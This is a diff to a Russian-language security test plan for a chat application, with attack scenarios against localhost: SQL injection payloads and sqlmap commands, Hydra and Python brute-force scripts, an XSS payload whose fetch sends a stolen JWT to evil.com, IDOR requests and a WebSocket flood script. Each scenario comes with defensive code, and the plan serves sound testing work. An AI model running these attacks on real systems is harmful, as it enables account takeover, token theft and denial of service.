@@ -9,48 +9,53 @@
 ## 2. Сценарий №1: SQL-инъекция через аутентификацию
 
 ### 2.1 Описание атаки
+
 **Цель**: Получение доступа к базе данных через уязвимый endpoint `/auth/login`
 
 **Тип**: Blind SQL Injection / Error-based SQL Injection
 
 **Инструменты**:
+
 - SQLMap (автоматизированная эксплуатация)
 - Burp Suite (ручное тестирование)
 
 ### 2.2 Пошаговый сценарий
 
 #### Фаза 1: Разведка
+
 ```bash
 # 1. Изучение Swagger документации
-curl http://localhost:3000/api
+curl http://localhost:3001/api
 
 # 2. Анализ структуры запросов
-curl -X POST http://localhost:3000/auth/login \
+curl -X POST http://localhost:3001/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"test","password":"test"}'
 ```
 
 #### Фаза 2: Тестирование уязвимости
+
 ```bash
 # Тест 1: Простая инъекция
-curl -X POST http://localhost:3000/auth/login \
+curl -X POST http://localhost:3001/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"any"}'
 
 # Тест 2: Union-based
-curl -X POST http://localhost:3000/auth/login \
+curl -X POST http://localhost:3001/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin'\'' UNION SELECT password FROM users --","password":"any"}'
 ```
 
 #### Фаза 3: Эксплуатация с SQLMap
+
 ```bash
 # Автоматизированная атака
 cd ChatDiffieHelman.Api/security-testing
 python sqlmap_automation.py
 
 # Целевое тестирование
-sqlmap -u "http://localhost:3000/auth/login" \
+sqlmap -u "http://localhost:3001/auth/login" \
   --data='{"username":"test","password":"test"}' \
   --headers="Content-Type: application/json" \
   --level=5 --risk=3 \
@@ -62,6 +67,7 @@ sqlmap -u "http://localhost:3000/auth/login" \
 ### 2.3 Ожидаемые результаты
 
 **Если уязвимо**:
+
 ```
 [INFO] testing 'PostgreSQL > 8.1 stacked queries'
 [INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 stacked queries' injectable
@@ -78,6 +84,7 @@ Table: users
 ```
 
 **Если защищено**:
+
 ```
 [WARNING] POST parameter 'username' does not seem to be injectable
 [CRITICAL] all tested parameters do not appear to be injectable
@@ -86,19 +93,20 @@ Table: users
 ### 2.4 Меры противодействия
 
 ✅ **Защита**:
+
 ```typescript
 // НЕ ИСПОЛЬЗОВАТЬ:
 const query = `SELECT * FROM users WHERE username='${username}'`;
 
 // ИСПОЛЬЗОВАТЬ (параметризованный запрос):
-const user = await this.userRepository.findOne({ 
-  where: { username } 
+const user = await this.userRepository.findOne({
+  where: { username },
 });
 
 // Или с TypeORM Query Builder:
 const user = await this.userRepository
-  .createQueryBuilder('user')
-  .where('user.username = :username', { username })
+  .createQueryBuilder("user")
+  .where("user.username = :username", { username })
   .getOne();
 ```
 
@@ -107,9 +115,11 @@ const user = await this.userRepository
 ## 3. Сценарий №2: Брутфорс атака на аутентификацию
 
 ### 3.1 Описание
+
 **Цель**: Подбор пароля для компрометации учетной записи
 
 **Инструменты**:
+
 - Hydra
 - Burp Suite Intruder
 - Custom Python script
@@ -117,6 +127,7 @@ const user = await this.userRepository
 ### 3.2 Пошаговый сценарий
 
 #### Шаг 1: Подготовка словаря
+
 ```bash
 # Создание словаря паролей
 cat > passwords.txt << EOF
@@ -131,20 +142,22 @@ EOF
 ```
 
 #### Шаг 2: Атака с Hydra
+
 ```bash
 # Брутфорс через HTTP POST
 hydra -l admin -P passwords.txt \
-  localhost -s 3000 \
+  localhost -s 3001 \
   http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
   -t 4 -w 30
 ```
 
 #### Шаг 3: Python скрипт для автоматизации
+
 ```python
 import requests
 import time
 
-API_URL = "http://localhost:3000/auth/login"
+API_URL = "http://localhost:3001/auth/login"
 passwords = ["password", "123456", "qwerty", "admin"]
 
 for password in passwords:
@@ -154,9 +167,9 @@ for password in passwords:
         "password": password
     })
     elapsed = time.time() - start_time
-    
+
     print(f"[{response.status_code}] Password: {password} - Time: {elapsed:.2f}s")
-    
+
     if response.status_code == 200:
         print(f"✓ SUCCESS! Password found: {password}")
         print(f"Token: {response.json().get('accessToken')}")
@@ -169,6 +182,7 @@ for password in passwords:
 ### 3.3 Результаты
 
 **Без защиты (УЯЗВИМО)**:
+
 ```
 [200] Password: admin - Time: 0.12s
 ✓ SUCCESS! Password found: admin
@@ -176,6 +190,7 @@ Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 ```
 
 **С rate limiting (ЗАЩИЩЕНО)**:
+
 ```
 [401] Password: password - Time: 0.15s
 [401] Password: 123456 - Time: 0.14s
@@ -188,17 +203,16 @@ Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 
 ```typescript
 // NestJS - rate limiting
-import { ThrottlerModule } from '@nestjs/throttler';
+import { ThrottlerModule } from "@nestjs/throttler";
 
 @Module({
   imports: [
     ThrottlerModule.forRoot({
       ttl: 900, // 15 минут
-      limit: 5,  // 5 попыток
+      limit: 5, // 5 попыток
     }),
   ],
 })
-
 // Custom guard для блокировки по IP
 @Injectable()
 export class LoginThrottlerGuard extends ThrottlerGuard {
@@ -206,17 +220,17 @@ export class LoginThrottlerGuard extends ThrottlerGuard {
     const request = context.switchToHttp().getRequest();
     const ip = request.ip;
     const username = request.body.username;
-    
+
     // Блокировка на 30 минут после 5 неудачных попыток
     const key = `login_attempts:${ip}:${username}`;
     const attempts = await this.redis.get(key);
-    
+
     if (attempts && parseInt(attempts) >= 5) {
       throw new TooManyRequestsException(
-        'Account locked for 30 minutes due to too many failed attempts'
+        "Account locked for 30 minutes due to too many failed attempts",
       );
     }
-    
+
     return super.handleRequest(context, limit, ttl);
   }
 }
@@ -227,6 +241,7 @@ export class LoginThrottlerGuard extends ThrottlerGuard {
 ## 4. Сценарий №3: XSS атака через сообщения чата
 
 ### 4.1 Описание
+
 **Тип**: Stored XSS (постоянное внедрение)
 
 **Цель**: Кража JWT токена через внедренный JavaScript
@@ -258,8 +273,9 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 ### 4.3 Сценарий атаки
 
 #### Шаг 1: Отправка зловредного сообщения
+
 ```bash
-curl -X POST http://localhost:3000/messages \
+curl -X POST http://localhost:3001/messages \
   -H "Authorization: Bearer $JWT_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -269,15 +285,18 @@ curl -X POST http://localhost:3000/messages \
 ```
 
 #### Шаг 2: Жертва открывает чат
+
 ```javascript
 // Если НЕ санитизируется, выполнится:
-fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))
-  .then(response => console.log('Token stolen!'))
+fetch("https://evil.com/steal?token=" + localStorage.getItem("jwt")).then(
+  (response) => console.log("Token stolen!"),
+);
 ```
 
 ### 4.4 Защита
 
 **Backend (NestJS)**:
+
 ```typescript
 import sanitizeHtml from 'sanitize-html';
 
@@ -288,7 +307,7 @@ async createMessage(@Body() dto: MessageDto) {
     allowedTags: [], // Запрещаем все теги
     allowedAttributes: {}
   });
-  
+
   return this.messageService.create({
     ...dto,
     content: sanitized
@@ -297,6 +316,7 @@ async createMessage(@Body() dto: MessageDto) {
 ```
 
 **Frontend (Angular)**:
+
 ```typescript
 import DOMPurify from 'dompurify';
 
@@ -312,23 +332,26 @@ displayMessage(message: string): string {
 ```
 
 **Content Security Policy (CSP)**:
+
 ```typescript
 // main.ts
-app.use(helmet({
-  contentSecurityPolicy: {
-    directives: {
-      defaultSrc: ["'self'"],
-      scriptSrc: ["'self'"],
-      styleSrc: ["'self'", "'unsafe-inline'"],
-      imgSrc: ["'self'", "data:", "https:"],
-      connectSrc: ["'self'"],
-      fontSrc: ["'self'"],
-      objectSrc: ["'none'"],
-      mediaSrc: ["'self'"],
-      frameSrc: ["'none'"],
+app.use(
+  helmet({
+    contentSecurityPolicy: {
+      directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'"],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:"],
+        connectSrc: ["'self'"],
+        fontSrc: ["'self'"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+      },
     },
-  },
-}));
+  }),
+);
 ```
 
 ---
@@ -336,6 +359,7 @@ app.use(helmet({
 ## 5. Сценарий №4: IDOR (Insecure Direct Object Reference)
 
 ### 5.1 Описание
+
 **Цель**: Доступ к ресурсам других пользователей через изменение ID
 
 ### 5.2 Сценарий
@@ -346,16 +370,16 @@ app.use(helmet({
 
 # Попытка A получить профиль B
 curl -H "Authorization: Bearer JWT_A" \
-     http://localhost:3000/users/2
+     http://localhost:3001/users/2
 
 # Попытка A читать чужие сообщения
 curl -H "Authorization: Bearer JWT_A" \
-     http://localhost:3000/chats/999/messages
+     http://localhost:3001/chats/999/messages
 
 # Попытка A удалить чужой чат
 curl -X DELETE \
      -H "Authorization: Bearer JWT_A" \
-     http://localhost:3000/chats/999
+     http://localhost:3001/chats/999
 ```
 
 ### 5.3 Защита
@@ -370,7 +394,7 @@ async getUser(
   if (req.user.id !== id && !req.user.isAdmin) {
     throw new ForbiddenException('Access denied');
   }
-  
+
   return this.userService.findOne(id);
 }
 
@@ -381,11 +405,11 @@ async getMessages(
 ) {
   // Проверка: пользователь - участник чата?
   const chat = await this.chatService.findOne(chatId);
-  
+
   if (!chat.participants.includes(req.user.id)) {
     throw new ForbiddenException('You are not a participant of this chat');
   }
-  
+
   return this.messageService.findByChatId(chatId);
 }
 ```
@@ -395,9 +419,11 @@ async getMessages(
 ## 6. Сценарий №5: DoS атака на WebSocket
 
 ### 6.1 Описание
+
 **Цель**: Перегрузка WebSocket сервера массовым подключением или флудом
 
 ### 6.2 Инструменты
+
 ```python
 # flood_websocket.py
 import asyncio
@@ -410,7 +436,7 @@ async def flood():
     await asyncio.gather(*tasks)
 
 async def connect_and_spam(client_id):
-    async with websockets.connect('ws://localhost:3000') as ws:
+    async with websockets.connect('ws://localhost:3001') as ws:
         for _ in range(1000):  # 1000 сообщений на клиента
             await ws.send(json.dumps({
                 "event": "message",
@@ -425,32 +451,32 @@ asyncio.run(flood())
 ```typescript
 // WebSocket Gateway
 @WebSocketGateway({
-  cors: { origin: ['http://localhost:4200'] }
+  cors: { origin: ["http://localhost:4200"] },
 })
 export class ChatGateway {
   private connectionLimits = new Map<string, number>();
-  
+
   @WebSocketServer()
   server: Server;
-  
+
   handleConnection(client: Socket) {
     const ip = client.handshake.address;
-    
+
     // Лимит подключений с одного IP
     const connections = this.connectionLimits.get(ip) || 0;
     if (connections >= 10) {
       client.disconnect();
       return;
     }
-    
+
     this.connectionLimits.set(ip, connections + 1);
   }
-  
-  @SubscribeMessage('message')
+
+  @SubscribeMessage("message")
   @UseGuards(WsThrottlerGuard) // Rate limiting
   async handleMessage(
     @MessageBody() data: any,
-    @ConnectedSocket() client: Socket
+    @ConnectedSocket() client: Socket,
   ) {
     // Обработка сообщения
   }
@@ -459,26 +485,27 @@ export class ChatGateway {
 // Rate limiting для WebSocket
 @Injectable()
 export class WsThrottlerGuard implements CanActivate {
-  private messageCount = new Map<string, {count: number, reset: number}>();
-  
+  private messageCount = new Map<string, { count: number; reset: number }>();
+
   canActivate(context: ExecutionContext): boolean {
     const client = context.switchToWs().getClient();
     const userId = client.user?.id;
-    
+
     if (!userId) return false;
-    
+
     const now = Date.now();
     const userLimit = this.messageCount.get(userId);
-    
+
     if (!userLimit || now > userLimit.reset) {
       this.messageCount.set(userId, { count: 1, reset: now + 60000 });
       return true;
     }
-    
-    if (userLimit.count >= 100) { // 100 сообщений в минуту
+
+    if (userLimit.count >= 100) {
+      // 100 сообщений в минуту
       return false;
     }
-    
+
     userLimit.count++;
     return true;
   }
@@ -507,22 +534,22 @@ sudo apt install -y sqlmap hydra burpsuite zaproxy metasploit-framework
 
 ```yaml
 # docker-compose.test.yml
-version: '3.8'
+version: "3.8"
 services:
   api:
     build: ./ChatDiffieHelman.Api
     ports:
-      - "3000:3000"
+      - "3001:3001"
     environment:
       - NODE_ENV=test
       - DB_HOST=db
-      
+
   db:
     image: postgres:15
     environment:
       - POSTGRES_DB=chatdb_test
       - POSTGRES_PASSWORD=testpass
-      
+
   kali:
     image: kalilinux/kali-rolling
     network_mode: "host"
@@ -562,13 +589,13 @@ cd /tests
 
 **Шаблон отчета**:
 
-| Сценарий | Статус | Уязвимо? | Серьезность | Рекомендация |
-|----------|--------|----------|-------------|--------------|
-| SQL-инъекция (login) | Протестировано | ❌ Нет | N/A | Параметризованные запросы работают |
-| Брутфорс (login) | Протестировано | ✅ Да | 🔴 Критическая | Внедрить rate limiting |
-| XSS (messages) | Требует теста | ❓ | 🔴 Высокая | Добавить санитизацию |
-| IDOR (users/:id) | Требует теста | ❓ | 🔴 Высокая | Проверка прав доступа |
-| DoS (WebSocket) | Требует теста | ❓ | 🟡 Средняя | Connection limiting |
+| Сценарий             | Статус         | Уязвимо? | Серьезность    | Рекомендация                       |
+| -------------------- | -------------- | -------- | -------------- | ---------------------------------- |
+| SQL-инъекция (login) | Протестировано | ❌ Нет   | N/A            | Параметризованные запросы работают |
+| Брутфорс (login)     | Протестировано | ✅ Да    | 🔴 Критическая | Внедрить rate limiting             |
+| XSS (messages)       | Требует теста  | ❓       | 🔴 Высокая     | Добавить санитизацию               |
+| IDOR (users/:id)     | Требует теста  | ❓       | 🔴 Высокая     | Проверка прав доступа              |
+| DoS (WebSocket)      | Требует теста  | ❓       | 🟡 Средняя     | Connection limiting                |
 
 ---
 
